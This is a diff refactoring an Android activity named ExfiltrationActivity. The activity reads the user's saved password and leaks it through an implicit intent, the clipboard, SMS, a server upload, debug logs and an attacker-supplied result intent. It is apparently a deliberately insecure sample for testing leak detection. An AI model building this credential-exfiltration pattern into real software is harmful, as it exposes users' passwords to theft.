@@ -26,9 +26,11 @@ public class ExfiltrationActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        String path = getIntent().getStringExtra("path");
-        String server = getIntent().getStringExtra("server");
-        String phone = getIntent().getStringExtra("phone");
+        Intent intent = getIntent();
+        String path = intent.getStringExtra("path");
+        String server = intent.getStringExtra("server");
+        String phone = intent.getStringExtra("phone");
+        Intent resultIntent = intent.getParcelableExtra("result_intent");
         String secret = LoginUtils.getInstance(this).getLoginData().password;
 
         sendViaImplicitActivityIntent(secret);
@@ -39,8 +41,8 @@ public class ExfiltrationActivity extends Activity {
         copyToClipboard(secret, path);
         sendViaSms(phone, secret, path);
         uploadToServer(server, secret, path);
-        logSensitiveData(secret);
-        setAttackerResult();
+        logSensitiveData(secret, path);
+        setAttackerResult(resultIntent);
         finish();
     }
 
@@ -122,13 +124,12 @@ public class ExfiltrationActivity extends Activity {
         }
     }
 
-    private void logSensitiveData(String secret) {
+    private void logSensitiveData(String secret, String path) {
         Log.d(TAG, "current password: " + secret);
-        Log.v(TAG, "request path: " + getIntent().getStringExtra("path"));
+        Log.v(TAG, "request path: " + path);
     }
 
-    private void setAttackerResult() {
-        Intent result = (Intent) getIntent().getParcelableExtra("result_intent");
+    private void setAttackerResult(Intent result) {
         if (result != null) {
             setResult(RESULT_OK, result);
         } else {
